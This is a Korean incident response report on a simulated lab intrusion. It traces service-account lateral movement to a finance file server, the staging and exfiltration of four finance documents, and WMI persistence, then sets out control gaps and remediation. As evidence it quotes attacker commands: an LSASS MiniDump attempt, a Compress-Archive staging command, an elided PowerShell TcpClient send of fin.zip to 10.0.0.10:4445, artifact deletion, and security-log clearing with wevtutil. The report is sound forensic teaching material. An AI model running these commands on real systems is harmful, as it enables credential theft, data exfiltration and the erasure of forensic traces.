# 침해사고 분석 보고서 (Incident Response Report)
## 다중 호스트 Active Directory 침해 및 재무 데이터 유출 사건

**사건번호:** IR-2026-1019
**분류:** 다중 호스트 AD 침해 — 측면이동·데이터 유출 (시뮬레이션 랩)
**작성:** DFIR 분석관
**문서 상태:** 최종 초안

> **본 보고서의 성격.** 격리 랩(CORP.LOCAL)에서 재현한 모의 다중호스트 침해에 대한 분석이다. 공격은 Atomic Red Team 및 수동 명령으로 재현하였고, 분석은 재현 과정에서 발생한 실 호스트의 라이브 텔레메트리(Windows 보안/Sysmon/PowerShell 로그)와 네트워크 캡처를 기반으로 한다.
> **증거 출처 표기:** 각 단계 제목에 출처를 **〔재현〕**(본 랩에서 직접 재현·수집) 또는 **〔참조〕**(선행 시나리오 분석으로 보완, 라이브 미재현)로 표시한다. 본 사건은 선행 사건(IR-2026-1018, R1 단일호스트 감염)의 **확산 단계**다.

## 1. 요약 (Executive Summary)

업무용 PC 한 대에서 시작된 침해가 재무 파일서버로 확산되어, 민감한 재무 문서가 외부로 유출된 사건이다. 공격자는 피해 PC를 경유지로 삼아 백업용 서비스 계정 권한으로 파일서버의 재무 공유 폴더에 접근하였고, 해당 파일들을 하나의 압축파일로 모아 외부 공격자 시스템으로 전송하였다. 유출 네트워크 기록에는 재무 문서 4종의 파일명이 그대로 확인되어, **데이터 유출은 정황이 아닌 직접 증거로 입증**되었다. 공격자는 재부팅 후에도 접근을 유지하기 위한 **은닉형 지속성(WMI 이벤트 구독)**을 설치하였으며, 이는 일반적인 레지스트리·자동실행 점검으로는 발견되지 않는다. 한편 공격자가 시도한 **자격증명 탈취(LSASS 메모리 접근)는 호스트 보호기능에 의해 차단**되어 실패하였다. 현재 사고는 분석 단계이며, 탈취 대상 계정의 암호 초기화와 은닉 지속성 제거가 즉시 필요하다.

## 4. 상세 분석 (공격 생애주기 순)

> 각 단계: **관측 사실 + 근거(도구/아티팩트) + 해석**. 제목의 〔재현〕/〔참조〕는 증거 출처. `> 증거 캡처:`는 스크린샷 삽입 자리. 원인 분석은 8장에서만 다룬다.

### 4-1. 초기 접근·실행·C2 〔참조〕
- **관측 사실:** 선행 시나리오상 피싱 실행파일로 거점을 확보하고 `10.0.0[.]10:4444`로 C2가 형성되었다. 본 재현 세션에서는 이 단계를 재현하지 않았다.
- **근거:** 선행(R1) 네트워크·메모리 분석.
- **해석:** 본 재현의 수집 범위 밖이므로 라이브 증거로는 **미확인(Undetermined)**으로 처리한다.

### 4-2. 권한상승 〔참조〕
- **관측 사실:** 선행 시나리오상 쓰기 권한이 열린 서비스 디렉터리(`C:\LabTools`)에 악성 바이너리를 투하하고 서비스를 재시작하여 **SYSTEM 권한으로 실행**되었다.
- **근거:** 선행 Sysmon(부모 `services.exe`, IntegrityLevel=System), System log 7036.
- **해석:** 해당 기법에 대응하는 Atomic 테스트가 없어 **라이브 미재현**. 라이브 증거만으로는 권한상승 성공 여부를 미확인으로 둔다(4-3의 LSASS 차단 결과와 함께 7장에서 권한 추론).

### 4-3. 자격증명 탈취 〔참조 · 재현: 차단〕
- **관측 사실:** 재현 중 comsvcs.dll MiniDump로 LSASS 메모리 덤프를 시도하였으나 **"Access is denied"로 차단**되었다. 실행 계정은 관리자이며 `SeDebugPrivilege`는 활성, LSA 보호(RunAsPPL)는 미설정으로 확인되었다.
- **근거:** Atomic 실행 결과(차단), `whoami /priv`, 레지스트리 조회(RunAsPPL 미존재).
- **해석:** 라이브 환경에서 **호스트 보호기능(Defender 등)이 LSASS 접근을 차단**한 것으로 평가된다(= 작동한 통제, 8장). 공격자의 자격증명 실제 탈취 여부는 라이브 증거만으로는 미확인이며, 선행 시나리오의 성공 흔적(Sysmon **Event 10**: `lsass.exe`, GrantedAccess `0x1fffff`)은 "성공 시 흔적" 예시로만 인용한다.
> 증거 캡처: ___ (Atomic "Access denied" 콘솔 / 참조: Event 10)
*그림 1. 자격증명 탈취 차단 — comsvcs.dll MiniDump "Access is denied" (Atomic 콘솔)*

### 4-4. 측면이동 〔재현〕
- **관측 사실:** FS01/DC에서 `CORP\svc_backup`의 **로그온 성공(4624), Type 3(네트워크), Elevated Token=Yes, 출발지=10.0.0.20(WS01), Logon ID 0x3D0C89**가 확인되었다. 동일 Logon ID로 공유 접근(5145)이 이어진다.
- **근거:** 보안 **4624** + 보안 **5145**(Logon ID 일치) — **2개 소스 교차검증**.
- **해석:** 외부 공격자(10.0.0[.]10)가 아니라 **내부 WS01(10.0.0.20)을 출발지로** 인증이 발생한 점에서, 공격자가 WS01을 **경유지로** 사용한 것으로 평가된다.
- **한계:** 본 재현은 `net use`를 통한 **암호 기반 인증**으로 수행되어, 선행 시나리오의 Pass-the-Hash와는 인증 방식이 다르다. 생성된 4624/5145는 유사하나 해시 재사용 여부는 미확인이다.
> 증거 캡처: ___ (보안 4624: svc_backup, Type3, Source 10.0.0.20)
*그림 2. 측면이동 — svc_backup 네트워크 로그온 (보안 4624, Type 3, 출발지 10.0.0.20)*

### 4-5. 수집 (Collection) 〔재현〕
- **관측 사실:** FS01/DC 상세 파일 공유 감사(5145)에 `svc_backup`(출발지 10.0.0.20)이 공유 `Finance`(경로 `C:\Shares\Finance`) 하위 4개 파일에 접근: `2026_Q3_Financials.xlsx`, `payroll_2026.csv`, `vendor_contracts.pdf`, `board_minutes_Q3.docx`.
- **근거:** 보안 **5145** ×4 (파일별).
- **해석:** 재무 공유 폴더의 해당 파일들을 읽기 접근한 것으로 평가된다. 5145는 공유 계층 접근 이벤트로, 그 자체가 네트워크 반출을 증명하지는 않는다(반출은 4-7).
> 증거 캡처: ___ (보안 5145 ×4, 파일명)
*그림 3. 재무 공유 접근 — Finance 4개 파일 (보안 5145 ×4)*

### 4-6. 스테이징·압축 〔재현〕
- **관측 사실:** WS01 PowerShell 로그(4104)에 `Compress-Archive -Path "\\10.0.0.30\Finance\*" -DestinationPath "C:\Users\Public\fin.zip" -Force` 기록. 원본이 **파일서버 Finance 공유 전체(`\*`)**임이 명령문에 명시됨.
- **근거:** PowerShell **4104**.
- **해석:** 재무 파일들을 **단일 압축파일(fin.zip)로 집약**한 수집·스테이징으로 평가된다. "fin.zip에 그 4개 파일 포함"은 5145(접근) + 4104(압축 소스) + pcap(내용 노출, 4-7)로 **교차검증**된다.
> 증거 캡처: ___ (PowerShell 4104: Compress-Archive 전문)
*그림 4. 수집·압축 — Compress-Archive → fin.zip (PowerShell 4104)*

### 4-7. 유출 (Exfiltration) 〔재현 · 강한 증거〕
- **관측 사실:**
  1. WS01의 `powershell.exe`가 **10.0.0.20 → 10.0.0[.]10:4445**로 네트워크 연결 (Sysmon Event 3).
  2. 동일 전송 명령(`New-Object Net.Sockets.TcpClient("10.0.0.10",4445) … fin.zip 전송`)이 PowerShell 4104에 기록.
  3. Kali 캡처(`exfil.pcap`)에서 해당 TCP 세션 및 **PK(zip) 시그니처와 함께 재무문서 4종의 파일명이 평문 노출**.
- **근거:** Sysmon **Event 3** + PowerShell **4104** + **exfil.pcap** — **3개 소스 교차검증**.
- **해석:** 재무 파일 압축본이 외부 공격자 시스템으로 **실제 전송**된 것으로 평가된다. 특히 pcap에서 개별 파일명이 직접 확인되어, "무엇이 유출되었는가"가 **직접 증거**로 입증된다.
- **데이터 흐름:** Finance 공유(FS01) → WS01(압축) → 10.0.0[.]10:4445(유출).
> 증거 캡처: ___ (Sysmon Event 3 / exfil.pcap 파일명)
*그림 5. 유출 — WS01 → 10.0.0.10:4445 연결 (Sysmon Event 3), exfil.pcap에 재무문서 4종 파일명 평문 노출*

### 4-8. 지속성 (Persistence) 〔재현: WMI 구독〕
- **관측 사실:** WS01 Sysmon에 **WMI 이벤트 구독 3종** 생성 — Event **19**(Filter), **20**(Consumer, Command Line → `notepad.exe`), **21**(Binding). 이름 `AtomicRedTeam-WMIPersistence-…`.
- **근거:** Sysmon **Event 19/20/21** (풀세트).
- **해석:** 레지스트리 Run 키·예약작업·자동실행 점검으로는 발견되지 않는 **파일리스 지속성**으로 평가된다(WMI `root\subscription` 저장).
- **부정 결과(확인됨):** 선행 시나리오의 예약작업(4698)·Run키(Event 13) 지속성은 **본 재현에서 미캡처 → 라이브 미확인.**
> 증거 캡처: ___ (Sysmon 19·20·21)
*그림 6. 파일리스 지속성 — WMI 이벤트 구독 Filter·Consumer·Binding (Sysmon 19·20·21)*

### 4-9. 방어 회피 / 안티포렌식 〔재현: 부분 · 참조〕
- **(a) 산출물 삭제 〔재현〕:** PowerShell 4104에 `del C:\Users\Public\lsass.dmp` 기록 → 덤프 산출물 삭제 시도. 단 4-3에서 LSASS 덤프가 차단되어 대상 파일 실존 여부는 미확인.
- **(b) 타임스톰프 〔재현: 약함〕:** Sysmon Event 2(FileCreateTime 변경)가 `C:\Users\Public\svchost.exe` 대상으로 관측되나, **변경 주체가 `MsMpEng.exe`(Windows Defender)**다.
  - **경합가설:** ① 공격자 타임스톰프 / ② Defender가 해당 파일을 처리하며 발생시킨 시각 변경. 주체가 Defender인 점에서 **②의 가능성이 높아 "공격자 타임스톰프" 근거로는 채택 보류.** 선행 시나리오에는 명확한 타임스톰프 예시(주체 `cmd.exe`, 생성시각 2019년 위조)가 존재.
- **(c) 로그 삭제 〔참조〕:** 선행 시나리오에는 `wevtutil cl Security`에 의한 보안로그 삭제(Event **1102**, 주체 svc_backup)가 존재한다. **본 재현에서는 의도적으로 수행하지 않음**(분석관 계정으로 로컬 삭제 시 1102 주체가 공격자가 아닌 분석관으로 기록되어 충실도 저하 — 제외 판단).

## 7. 피해 범위 및 근본 원인 (요약)

- **피해 범위:** WS01(경유지) → **FS01/DC(재무 파일서버)로 확산.** 재무문서 4종이 외부(10.0.0[.]10)로 유출됨(직접 증거). 선행(R1)의 단일 호스트 침해가 본 사건에서 **파일서버로 2차 확산**됨.
- **근본 원인(1줄):** 과도한 권한을 가진 서비스 계정(`svc_backup`, 파일서버 관리자)의 자격증명이 공격자에게 재사용되어, 내부 경유 측면이동과 재무 데이터 유출로 이어짐. (상세 8장)
- **공격자 권한 수준 추론:** 라이브에서 **LSASS 접근이 차단**된 점은 SYSTEM 수준의 자유로운 자격증명 탈취까지는 미달성했을 가능성을 시사한다(미확인). 다만 측면이동·수집·유출·WMI 지속성이 라이브로 확인되므로, **최소 svc_backup 권한(파일서버 관리자)으로 유출을 수행**한 것은 확정적이다.

## 8. 보안 통제 격차 분석

> 통제 상태: ① 통제 부재 / ② 존재하나 우회됨 / ③ 탐지했으나 대응 없음

| 공격 단계 | 미비/실패 통제 | 결과 | 근거 |
|---|---|---|---|
| 권한상승 | 서비스 디렉터리 ACL 미비(일반사용자 쓰기 가능) ① | 일반→SYSTEM 상승 | 참조(icacls) |
| 측면이동 | 과도한 서비스 계정 권한 + 자격증명 재사용 통제 부재 ① | 파일서버 접근 성공 | 재현(4624/5145) |
| 수집·유출 | 공유 접근 모니터링/DLP 부재 ③ | 재무문서 유출 | 재현(5145/Event3/pcap) |
| 지속성 | WMI 구독 탐지 룰 부재 ① | 은닉 지속성 설치 | 재현(Sysmon 19/20/21) |

**작동한 통제 (피해 경감):**
- **LSASS 접근 차단** — 호스트 보호기능이 자격증명 덤프를 차단(재현 확인). 자격증명 광범위 탈취를 저지.
- **상세 감사 로깅(Sysmon/보안/PS)** — 공격 전 과정이 로그로 포착되어 사후 재구성 가능.

**원인 분류:**
- 기술(Technical): 서비스 디렉터리 ACL 미비, WMI 구독 탐지 룰 부재, DLP/공유접근 통제 부재.
- 프로세스(Process): 탐지 로그는 생성되나 **실시간 모니터링·대응 체계 부재**(③).
- 사람(People): 서비스 계정 **과잉 권한·자격증명 로테이션 관리 미흡.**

**근거 확인 vs 추정:** ACL 미비·WMI 탐지 부재·과잉 권한은 증거로 확인. "실시간 대응 부재"는 로그만 있고 대응 흔적이 없다는 점에서 추정(대응 체계 자체는 수집 범위 밖).

**핵심 원인 요약:** 본 사고는 **① 과도한 권한의 서비스 계정 자격증명 재사용을 막는 통제의 부재와, ② 은닉형(WMI) 지속성 및 공유 데이터 유출을 탐지·대응하는 체계의 부재**로 인해 발생하였다.

## 9. 대응 및 권고 (8장 격차에 1:1 대응)

**즉시 조치 (격리 · 근절 · 복구)**
1. **격리:** WS01·FS01/DC 네트워크 차단, 외부 10.0.0[.]10 및 포트 4444/4445 차단.
2. **근절 — 빠짐없이 (하나라도 놓치면 재부팅 시 부활):**
   - **WMI 이벤트 구독 3종 제거** (`Get-WmiObject -Namespace root\subscription …` 확인 후 삭제) ← WMI 탐지 부재 대응.
   - (실환경 존재 시) 예약작업·HKCU Run 키·`C:\Users\Public\svchost.exe`, `fin.zip`·`lsass.dmp` 제거.
3. **자격증명(최우선):** **`svc_backup` 암호 즉시 초기화** 및 과잉 권한 회수 ← 자격증명 재사용·과잉 권한 대응. 관련 계정 점검.
4. **복구:** 서비스 디렉터리 ACL 교정 ← ACL 미비 대응. 영향 호스트 재이미징 검토.

**재발 방지 (각 항목이 8장 격차에 대응)**
- 서비스 계정 권한 최소화 + **정기 자격증명 로테이션 / gMSA** (← 과잉 권한·재사용).
- **WMI 이벤트 구독 생성 탐지 룰 상시화**(Sysmon 19/20/21) (← WMI 탐지 부재).
- 재무 공유 **DLP/접근 모니터링 + 대용량 아웃바운드 알림** (← DLP 부재).
- **로그 중앙(SIEM/WEC) 포워딩** + 실시간 모니터링·대응 절차 (← 로그삭제·대응 부재).
- **LSA 보호(RunAsPPL)/Credential Guard** 확대 (← 효과 확인된 통제 강화).

## 10. 결론 및 교훈

**핵심 요약:** 업무용 PC를 경유지로 삼은 공격자가 과잉 권한 서비스 계정(`svc_backup`)으로 재무 파일서버에 접근, 재무문서 4종을 압축하여 외부로 유출하였고(직접 증거), 은닉형 WMI 지속성을 설치하였다. 자격증명 탈취(LSASS)는 호스트 보호기능에 의해 차단되었다. 전 과정이 상세 로깅으로 포착되어 사후 재구성이 가능하였다.

**미해결 질문 (Open Questions):**
- 공격자가 **실제로 자격증명을 탈취했는가?** (라이브 LSASS 차단 / 참조는 성공 — 메모리 포렌식 부재로 미확정)
- svc_backup 인증이 **해시 재사용(PtH)이었는가?** (재현은 암호 인증 — 미확정)
- 유출 fin.zip의 **정확한 내용·건수·무결성 해시** (해시 미산출)
- **예약작업/Run키 등 추가 지속성의 라이브 존재 여부** (미확인)

**교훈 (Lessons Learned):**
- **접근(5145)과 반출(네트워크 전송)은 다른 계층의 증거**이며, 유출 입증에는 네트워크 측 증거가 필요하다. 본 사건에서 pcap이 파일명을 직접 보여 유출이 확정되었다.
- **은닉형 지속성(WMI 구독)은 전용 탐지가 없으면 놓친다.** 호스트·네트워크·로그 교차검증이 필요하다.
- **로그 중앙 수집이 안티포렌식(로그 삭제)에 대한 최선의 방어**다.
- 본 사건은 선행(R1)의 **"일반 권한 한정" 공격자가 권한상승·확산을 시도한 다음 장**에 해당한다.

## 【작성 후 개선 필요사항 (Areas Needing Improvement)】

1. **무결성 해시 부재 — 최우선.** 라이브 산출물(fin.zip·로그·exfil.pcap)의 SHA-256 미산출. 증거 재현성·법적 효력을 위해 해시 산출 및 "검증 사본 분석" 명시 필요.
2. **메모리/디스크 포렌식 미수행.** 자격증명 탈취 성공 여부·PtH 여부·추가 지속성 등 다수 Open Question이 이미지 미획득으로 미확정. 메모리 수집 + Volatility 교차검증 시 상당수 해소 가능.
3. **클럭 스큐 — 타임라인 신뢰성.** 스냅샷 복원으로 VM 시계가 흩어져 절대 시각 순서화 불가. 재현 시 **NTP 시간 동기화 고정** 및 수집 전 시각 검증 필요.
4. **라이브 재현 범위 공백.** 초기접근·실행·C2·권한상승·로그삭제·일부 지속성이 라이브 미재현(참조 의존). 해당 단계 라이브 재현 또는 "참조 보완" 라벨링 명확화 권장.
5. **타임스톰프 증거 약함.** 라이브 Event 2의 주체가 Defender(MsMpEng)여서 공격자 타임스톰프로 채택 불가. 공격자 컨텍스트의 명시적 타임스톰프($SI vs $FN 불일치) 재현 시 증거 강화.
